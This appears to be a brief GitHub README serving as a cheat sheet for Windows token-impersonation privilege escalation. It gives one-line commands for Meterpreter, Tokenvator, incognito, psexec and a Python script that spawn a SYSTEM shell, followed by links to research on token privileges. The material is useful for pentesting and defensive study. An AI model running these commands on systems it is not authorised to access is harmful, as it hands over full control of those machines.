## tokenx_privEsc
with metasploit <br>
`meterpreter> getsystem`
<br><br>

without metasploit <br>
`C:\temp> Tokenvator.exe getsystem cmd.exe` <br>
![test1](https://github.com/sailay1996/tokenx_privEsc/blob/master/img/tokenpriv1.jpg) <br><br>

`C:\temp> incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe` <br>
![test2](https://github.com/sailay1996/tokenx_privEsc/blob/master/img/tokenpriv2.jpg) <br><br>


`C:\temp> psexec -s -i cmd.exe` <br>
![test4](https://github.com/sailay1996/tokenx_privEsc/blob/master/img/tokenpriv4.jpg) <br><br>


`C:\temp> python getsystem.py` <br>
![test3](https://github.com/sailay1996/tokenx_privEsc/blob/master/img/tokenpriv3.jpg) <br><br>


### more about tokens privilege <br>
### Resources:
https://github.com/py7hagoras/GetSystem <br>
https://gist.github.com/mvelazc0/9a4f05a67a12a86181e89f6026a020f2 <br>
https://blog.xpnsec.com/becoming-system/ <br>
https://github.com/hatRiot/token-priv <br>
https://powersploit.readthedocs.io/en/latest/Privesc/Get-System/ <br>
https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/ <br>
https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/ <br>
https://hunter2.gitbook.io/darthsidious/privilege-escalation/token-impersonation <br>
https://heynowyouseeme.blogspot.com/2019/08/the-useage-of-9-permissions-for-windows.html <br>
https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation <br>
https://github.com/sailay1996/NP_impersonate <br>
https://github.com/Cn33liz/EasySystem <br>
https://labs.mwrinfosecurity.com/blog/incognito-v2-0-released/ <br>
https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/ <br>
https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html <br>
https://0x00-0x00.github.io/research/2018/10/21/Windows-API-And-Impersonation-Part-2.html <br>
https://pentestlab.blog/tag/token-impersonation/ <br>
https://github.com/0xbadjuju/Tokenvator/ <br>
https://decoder.cloud/2019/07/04/creating-windows-access-tokens/ <br>
https://github.com/decoder-it/whoami-priv <br>
https://decoder.cloud/2018/02/02/getting-system/ <br>
https://gist.githubusercontent.com/realoriginal/19c2c9c3b14ec65c203dd796ad44e5c5/raw/b4900e95506d8dc4d3b415ad9b27c6cc73544d94/np_impersonate.c <br>
